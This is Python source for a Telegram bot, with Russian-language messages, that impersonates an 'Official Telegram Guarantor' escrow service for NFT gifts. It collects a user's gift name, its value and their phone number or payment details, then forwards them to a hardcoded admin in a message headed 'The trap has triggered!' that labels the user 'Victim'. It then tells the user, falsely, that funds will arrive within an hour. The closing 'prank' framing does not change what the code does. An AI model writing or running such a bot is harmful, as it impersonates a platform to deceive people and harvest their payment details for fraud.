import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

API_TOKEN = os.getenv('BOT_TOKEN')
bot = telebot.TeleBot(API_TOKEN)
user_states = {}

@bot.message_handler(commands=['start'])
def cmd_start(message):
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton('🎁 Создать сделку с NFT', callback_data='create_deal'))
    bot.send_message(
        message.chat.id,
        '🤖 **Добро пожаловать в Официальный Гарант Telegram!**\n\n'
        'Здесь можно безопасно передавать NFT-подарки без комиссий.',
        reply_markup=keyboard,
        parse_mode='Markdown'
    )

@bot.callback_query_handler(func=lambda call: call.data == 'create_deal')
def start_deal(call):
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, '🎁 Введите название NFT-подарка, который хотите передать:')
    user_states[call.from_user.id] = {'step': 'waiting_for_item'}

@bot.message_handler(func=lambda message: message.from_user.id in user_states and user_states[message.from_user.id]['step'] in ['waiting_for_item', 'waiting_for_price', 'waiting_for_phone'])
def handle_steps(message):
    user_id = message.from_user.id
    state_data = user_states[user_id]
    
    if state_data['step'] == 'waiting_for_item':
        state_data['item'] = message.text
        state_data['step'] = 'waiting_for_price'
        bot.send_message(message.chat.id, '💵 Укажите оценочную стоимость подарка (например, в USDT или баксах):')
    
    elif state_data['step'] == 'waiting_for_price':
        state_data['price'] = message.text
        state_data['step'] = 'waiting_for_phone'
        bot.send_message(message.chat.id, '✅ Отлично! Теперь укажите ваш номер телефона или реквизиты для получения выплаты:')
    
    elif state_data['step'] == 'waiting_for_phone':
        item = state_data.get('item')
        price = state_data.get('price')
        phone = message.text
        user_name = message.from_user.full_name
        username = f"@{message.from_user.username}" if message.from_user.username else "нет юзернейма"
        
        bot.send_message(
            message.chat.id,
            '⏳ **Сделка зарегистрирована!**\nОжидаем подтверждения от Гаранта и перевода средств...',
            parse_mode='Markdown'
        )
        
        # ЗАМЕНИ 123456789 НА СВОЙ РЕАЛЬНЫЙ TELEGRAM ID ЦИФРАМИ
        ADMIN_ID = 123456789
        
        admin_keyboard = InlineKeyboardMarkup()
        admin_keyboard.add(InlineKeyboardButton('✅ Подтвердить перевод денег', callback_data=f'approve_{user_id}'))
        
        bot.send_message(
            ADMIN_ID,
            f'🚨 **Сработала ловушка!**\n\n'
            f'👤 Жертва: {user_name} ({username})\n'
            f'🎁 Подарок: {item}\n'
            f'💰 Стоимость: {price}\n'
            f'📞 Реквизиты: {phone}',
            parse_mode='Markdown',
            reply_markup=admin_keyboard
        )
        
        del user_states[user_id]

@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_'))
def approve_deal(call):
    target_user_id = int(call.data.split('_')[1])
    bot.answer_callback_query(call.id)
    
    bot.send_message(
        target_user_id,
        '✅ **Сделка совершена успешно!**\n\nСредства будут отправлены вам в течение часа с момента конца сделки.',
        parse_mode='Markdown'
    )
    
    bot.edit_message_text(
        '✅ Вы успешно подтвердили сделку и разыграли друга!',
        call.message.chat.id,
        call.message.message_id
    )

if __name__ == '__main__':
    bot.infinity_polling()
